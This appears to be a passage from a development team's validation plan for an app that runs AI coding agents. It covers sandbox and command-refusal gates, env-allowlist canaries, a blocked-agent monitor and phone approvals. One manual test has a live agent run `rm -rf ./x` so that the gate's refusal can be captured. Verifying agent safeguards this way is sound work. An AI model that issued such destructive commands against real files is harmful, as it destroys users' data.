`test/agent-provider.test.cjs` is a hand-rolled harness that `ts.transpileModule`s four `src/shared/*.ts`
files with no alias resolution and no electron stub, and therefore **cannot load either function under
test** (`src/main/config.ts:1` imports electron; `src/renderer/src/store/config.ts:3` imports
`@shared/…`). `test/load-ts.cjs` does both.

**Skipped-count impact: ZERO.** No Phase 4 file is POSIX-gated. Plans 04-01, 04-06, 04-07, 04-13, 04-16
and 04-20 each carry `node --test test/suite-integrity.test.cjs` as a per-task check, and plan 04-19
states the phase total.

**One addition the original Wave 0 did not name:** `ApprovalRegistry`'s unit coverage (unguessable
single-use ids, TTL expiry, `PHONE_TASK_ID_RE` conformance) extends the existing
**`test/control.test.cjs`** rather than adding another file -- that file is already the house analog
for a pure, electron-free main module driven with an injected clock. Owned by plan 04-15 / T1, wave 4.

**No framework install needed. No `package.json` edit (D-36).** Every new file follows
`test/boot-floor.test.cjs`'s per-test isolated `(userData, harnessHome)` pattern (`:71-85`).

---

## Manual-Only Verifications

Six rows, up from four. Two were added by red-team round 1 after the phase's claims were found to rest
on live evidence no task produced (BL-11) or on a hint list never once observed against a non-Claude
engine (H-4). Both ride an agent the phase already hires, so they cost one prompt each.

| Behavior | Requirement | Why Manual | Owning task | Test Instructions |
|----------|-------------|------------|-------------|-------------------|
| A live codex agent with the sandbox on finishes a task, mails, and writes `memory.md` with **no write refused** | GATE-04 | No automated harness can spawn an authenticated codex agent against a real workspace — and hooks/prompts fire in **interactive** sessions only (`hiveProvisioning.ts:207`), so the spike cannot substitute | 04-13-T4 | Hire one codex agent with the opt-in on; assign a card; confirm task done + mail delivered + `memory.md` written. Codex 0.128.0 is installed and logged in here. |
| **A live agent has a command REFUSED by GATE-03** | GATE-03 | Nothing in the phase runs a live agent and observes a refusal; plan 04-10's honest claim has no other evidence | 04-13-T4 | Same codex agent: ask it to run one of the four shapes (`rm -rf ./x` inside its own worktree is safest). Capture the refusal and main's reason string. **If it does not appear, 04-10's claim is corrected downward in the same commit.** |
| **A live non-Claude agent sitting on a prompt is (or is not) marked `blocked`** | VIGIL-03 | `BLOCK_HINTS` was moved verbatim from Claude Code's TUI shapes; codex is the only other engine installed here, so this is the phase's only measurement of whether it matches anything else | 04-13-T4 | Same codex agent: when it hits a prompt, record whether the floor marked it blocked. **Either answer is evidence** — a match retires plan 04-07's ceiling item for codex, a miss confirms it. |
| One live **non-Claude** agent still authenticates and completes a task after the env allowlist lands | GATE-02 | D-13's explicit condition — the regression this change is most likely to cause | 04-05-T3 | Same codex agent, opt-in off. **Stated ceiling:** codex authenticates from `auth.json`, not env, so this half cannot fail for L-04's reason; the reachable assertions are a planted `CANARY_DROP` **absent** and `HIVE_CANARY_KEEP`/`USERPROFILE` **present** in the agent's `env`. |
| GATE-05 approval answered on a **physical Android phone** | GATE-05 | The PWA service worker updates on its own schedule; no local reproduction. **Plan 04-17's SUMMARY must say "answerable through the phone's own endpoints, device-unverified"** — no device exists in wave 5 | 04-19-T3 | Trigger an ask, answer it from the phone. **"Verification needs a real device" is a first-class outcome here, not a failure.** |
| A9 focus retention, the click-driven action-row swap, and the ticking countdown on the desktop banner | GATE-05 | `renderToStaticMarkup` *"runs no effects, fires no events, never commits"* (`test/renderer-components.test.cjs:23-38`); D-27 rejected jsdom/RTL and this phase adds no Playwright | 04-18-T4 | Click `approve`, show the banner still mounted with an outcome plus `dismiss`, tab once and show focus already on `dismiss`. The static suite asserts the post-resolution **shape** from props; only this shows the transition. |
| GATE-03 denial honoured by grok / pi / OpenCode | GATE-03 | None of those CLIs are installed on this machine and grok needs an xAI key | — (not runnable) | Not runnable. Ship `LIVE-UNVERIFIED` markers and update `MARKER_LEDGER` in the same commit. |

---

## Validation Sign-Off

- [ ] All 59 tasks have an `<automated>` verify or a named Wave 0 dependency, and a row in the map above
- [ ] Sampling continuity: no 3 consecutive tasks without automated verify
- [ ] Wave 0 covers all ❌ references above
- [ ] No watch-mode flags in any command
- [ ] Feedback latency < 24 s
- [ ] **Skipped count is unchanged at 7** — the delta is stated in the SUMMARY and it is zero
- [ ] `node --test test/suite-integrity.test.cjs` green, with `DECLARED_SKIPS` and `FROZEN` untouched
- [ ] `wave_0_complete: true` set (plan 04-19 task 2, against plan 04-01's two deliverables)
- [ ] `status` moved off `draft` (plan 04-19 task 2)
- [ ] `nyquist_compliant: true` set in frontmatter (flip only after the plan-checker confirms Dimension 8;
      if it is not confirmed, plan 04-19's SUMMARY states why in writing — a phase does not close with an
      unexplained `false` here)

**Approval:** planned 2026-08-25, revised after red-team round 1 the same day —
**20 plans, 7 waves, 59 tasks**. Every task above is claimed by a named row and every behaviour row is
claimed by a named task. The three frontmatter flags stay at their draft values until plan 04-19 task 2
flips them, and only against evidence.
